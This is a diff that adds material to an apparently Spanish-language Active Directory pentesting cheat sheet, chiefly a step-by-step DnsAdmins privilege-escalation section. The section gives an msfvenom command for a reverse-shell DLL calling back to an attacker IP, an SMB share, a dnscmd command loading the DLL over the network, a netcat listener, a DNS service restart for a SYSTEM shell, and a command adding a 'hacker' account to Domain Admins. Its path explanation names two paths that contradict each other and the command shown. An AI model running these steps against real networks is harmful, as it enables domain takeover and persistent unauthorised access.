@@ -2710,6 +2710,9 @@ net view \\172.16.0.1 /all
 Buscamos información sensible.
 
 ```powershell
+Get-ChildItem -Force
+ls -Force
+
 where /R C:\ bash.exe # Realiza una búsqueda del archivo (en este caso del binario bash.exe) en el sistema
 
 Get-History
@@ -5060,6 +5063,89 @@ netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-s
 ####  11.5.1. <a name='account-operators'></a>Account Operators
 ####  11.5.2. <a name='server-operators'></a>Server Operators
 ####  11.5.3. <a name='dnsadmins'></a>DnsAdmins
+
+Los usuarios que son miembros del grupo **DnsAdmins** tienen la capacidad de abusar de una característica del protocolo de gestión DNS de Microsoft para hacer que el servidor DNS cargue cualquier DLL especificada. El servicio que a su vez, ejecuta la DLL se realiza en el contexto de SYSTEM y podría utilizarse en un controlador de dominio (desde donde se ejecuta DNS normalmente) para obtener privilegios de administrador de dominio.
+
+En el siguiente ejemplo, el usuario `ryan` pertenece al grupo `DnsAdmins`.
+
+##### Enumeración
+
+PowerShell
+
+```powershell
+Get-ADGroupMember -Identity "DnsAdmins"
+```
+
+Powerview
+
+```powershell
+Get-NetGroupMember -Identity "DNSAdmins"
+```
+
+net
+
+```powershell
+net user ryan /domain
+```
+
+Bloodhound
+
+![DnsAdmins](./img/dnsadmins.png)
+
+##### Explotación
+
+1. Creación de la DLL maliciosa
+
+    `msfvenom` puede ser utilizado para crear una DLL maliciosa que, cuando es ejecutada por DNS se conectará de nuevo a la máquina del atacante en el contexto de SYSTEM en el Domain Controller.
+
+    ```bash
+    msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f dll > exploit.dll
+    ```
+
+2. Creamos un recurso compartido con `impacket-smbserver`
+
+    ```bash
+    impacket-smbserver -smb2support kali .
+    ```
+
+3. Registrar la DLL.
+
+    Una vez que la DLL maliciosa se ha cargado en el objetivo, se puede utilizar el siguiente comando para registrar la DLL.
+
+    ```powershell
+    dnscmd.exe RESOLUTE /config /serverlevelplugindll \\10.10.14.11\kali\exploit.dll
+    ```
+
+    1. `dnscmd.exe`: Es una herramienta de línea de comandos utilizada para administrar y configurar servidores DNS en entornos de Windows.
+    2. `resolute`: Es el nombre del servidor DNS al que se enviará el comando. En este caso, "resolute" es el nombre de ejemplo del servidor al que se desea enviar la configuración.
+    3. `/config`: Indica que se está realizando una operación de configuración en el servidor DNS.
+    4. `/serverlevelplugindll`: Este parámetro especifica que se está configurando un complemento DLL a nivel de servidor en el servidor DNS. Los complementos DLL pueden proporcionar funcionalidades adicionales al servidor DNS.
+    5. `C:\Users\Ryan\Documents\exploit.dll`: Esta es la ruta de la DLL que se está intentando cargar como complemento en el servidor DNS. En este caso, se está especificando la ruta completa del archivo DLL llamado `exploit.dll` ubicado en la carpeta "C:\Users\Moe\Documents".
+
+    6. Escucha con `netcat` (Atacante)
+    En nuestro host de ataque, nos ponemos en escucha con netcat en el puerto especificado anteriormente en el comando msfvenom.
+
+    ```bash
+    rlwrap nc -lnvp 4444
+    ```
+
+4. Detener e iniciar el servicio DNS
+
+    A partir de aquí, detener el servicio DNS e iniciarlo de nuevo generará un intérprete de comandos SYSTEM para el oyente netcat.
+
+    ```powershell
+    sc.exe stop dns
+    sc.exe start dns
+    ```
+
+5. Persistencia
+
+    Desde aquí se puede conseguir la persistencia de Administrador de Dominio. Se puede crear un nuevo usuario con privilegios de Administrador de Dominio.
+
+    ```bash
+    net user hacker Password123! /add && net group "Domain Admins" /add hacker
+    ```
+
 ####  11.5.4. <a name='backup-operators'></a>Backup Operators
 
 ###  11.6. <a name='kerberos'></a>Kerberos
